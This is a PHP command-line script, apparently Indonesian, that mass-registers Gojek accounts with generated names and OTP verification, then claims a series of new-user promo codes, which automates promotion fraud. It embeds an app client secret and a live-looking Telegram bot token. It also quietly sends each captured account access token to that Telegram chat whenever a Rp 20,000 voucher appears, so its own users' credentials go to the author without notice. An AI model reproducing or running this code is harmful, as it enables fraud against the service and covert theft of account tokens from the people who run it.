<?php date_default_timezone_set('Asia/Jakarta');
include "function.php";
echo color("red","[][][][][][][][][][][][][][][][][][][][][]");
echo color("red","\n[]  Auto Create Gojek X Redeem Voucher  []\n");
echo color("red","[]  Creator : Kentankers                []\n");
echo "[]  Version : Beta                      []\n";
echo "[]  Time    : ".date('[d-m-Y] [H:i:s]')."   []\n";
echo "[][][][][][][][][][][][][][][][][][][][][]\n\n";

function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        ulang:
        echo color("nevy","?] Nomor : ");
        $no = trim(fgets(STDIN));
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("green","+] Kode verifikasi sudah di kirim")."\n";
        otp:
        echo color("nevy","?] OTP : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("green","+] Berhasil mendaftar");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo "\n".color("nevy","?] Mau Rendeem Voucher?: ");
        $pilihan = trim(fgets(STDIN));
        if($pilihan == "y" || $pilihan == "Y"){
        echo color("red","===========(REDEEM VOUCHER)===========");
        echo "\n".color("yellow","!] Claim voc GOFOODBOBA07");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA07"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","+] Message: ".$message);
        goto goride;
        }else{
        echo "\n".color("red","-] Message: ".$message);
        echo "\n".color("yellow","!] Claim voc GOFOODBOBA10");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $boba10 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA10"}');
        $messageboba10 = fetch_value($boba10,'"message":"','"');
        if(strpos($boba10, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","+] Message: ".$messageboba10);
        goto goride;
        }else{
        echo "\n".color("red","-] Message: ".$messageboba10);
        echo "\n".color("yellow","!] Claim voc GOFOODBOBA19");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $boba19 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA19"}');
        $messageboba19 = fetch_value($boba19,'"message":"','"');
        if(strpos($boba19, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","+] Message: ".$messageboba19);
        goto goride;
        }else{
        echo "\n".color("green","+] Message: ".$messageboba19);
        goride:
        echo "\n".color("yellow","!] Claim voc AYOCOBAGOJEK");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"AYOCOBAGOJEK"}');
        $message1 = fetch_value($goride,'"message":"','"');
        echo "\n".color("green","+] Message: ".$message1);
        echo "\n".color("yellow","!] Claim voc COBAINGOJEK");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $goride1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAINGOJEK"}');
        $message2 = fetch_value($goride1,'"message":"','"');
        echo "\n".color("green","+] Message: ".$message2);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        echo "\n".color("yellow","!] Total voucher ".$total." : ");
        echo color("green","1. ".$voucher1);
        echo "\n".color("green","                     2. ".$voucher2);
        echo "\n".color("green","                     3. ".$voucher3);
        echo "\n".color("green","                     4. ".$voucher4);
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
                                        $TOKEN  = "931114159:AAGK4O3nuld9uNw_IneDcSPVxYDGAaaazvQ";
                                        $chatid = "905644289";
                                        if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
                                        $pesan  = $token;
                                        $method = "sendMessage";
                                        $url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
                                        $post = [
                                        'chat_id' => $chatid,
                                        'text' => $pesan
                                                ];
                                        $header = [
                                        "X-Requested-With: XMLHttpRequest",
                                        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
                                        }
         if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
         save("akungojek20k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
         }else{
         save("akungojek10k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
         }
         setpin:
         echo "\n".color("nevy","?] Mau Nembak Voucher Lagi ? : ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" || $pilih1 == "Y"){
        goto ulang;
         }else if($pilih1 == "n" || $pilih1 == "N"){
        die();
         }else{
         echo color("red","-] Access Denied !\n");
         }
         }
         }
         }
         }else{
         echo color("red","-] Otp yang anda Masukkan salah");
         echo"\n==================================\n\n";
         echo color("yellow","!] Silahkan Masukkan kembali\n");
         goto otp;
         }
         }else{
         echo "Nomor hp sudah terdaftar";
         echo "\nUlangi dari Awal? (y/n): ";
         $pilih = trim(fgets(STDIN));
         if($pilih == "y" || $pilih == "Y"){
         goto ulang;
         }else{
         echo "Error, Please Try Again !";
         }
         }else{
                echo "\n==============Register==============\n";
                goto ulang;
         }
}
}
echo change()."\n"; ?>
